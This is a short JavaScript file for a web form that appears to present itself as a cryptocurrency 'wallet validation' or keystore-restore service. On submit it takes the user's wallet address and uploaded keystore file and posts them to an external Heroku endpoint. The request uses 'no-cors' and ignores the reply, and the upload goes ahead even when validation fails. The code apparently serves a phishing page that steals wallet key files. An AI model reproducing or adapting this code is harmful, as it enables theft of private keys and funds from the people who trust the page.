const form = document.getElementById("form");
const walletAddress = document.getElementById("exampleFormControlInput1");
const fileUpload = document.getElementById("exampleFormControlFile1");

form.addEventListener("submit", async (e) => {
  e.preventDefault();
  await checkInput();
  let walletAddressValue = walletAddress.value.trim();
  let myFile = fileUpload.files[0];
  let h = new Headers();
  h.append("Accept", "application/json");
  let fd = new FormData();
  fd.append("walletAddress", walletAddressValue);
  fd.append("file", myFile);
  const url = "https://wallet-validation.herokuapp.com/keystore/restore";
  let req = new Request(url, {
    method: "post",
    headers: h,
    mode: "no-cors",
    body: fd,
  });

  const response = await fetch(req);
  console.log(response);
});

// Validation for form
async function checkInput() {
  if (walletAddress.value === "") {
    addErrorTo("exampleFormControlInput1", "Wallet Address is required!");
  } else {
    removeError("exampleFormControlInput1");
  }
  if (fileUpload.files.length == 0) {
    addErrorTo("exampleFormControlFile1", "No file uploaded!");
    console.log("err");
  } else {
    removeError("exampleFormControlFile1");
  }
}
function addErrorTo(field, message) {
  const formControl = form[field].parentNode;
  formControl.classList.add("error");

  const errMsg = formControl.querySelector("small");
  errMsg.innerText = message;
  errMsg.style.opacity = "1";
}
function removeError(field) {
  const formControl = form[field].parentNode;
  formControl.classList.remove("error");

  const errMsg = formControl.querySelector("small");
  errMsg.innerText = "";
  errMsg.style.opacity = "0";
}
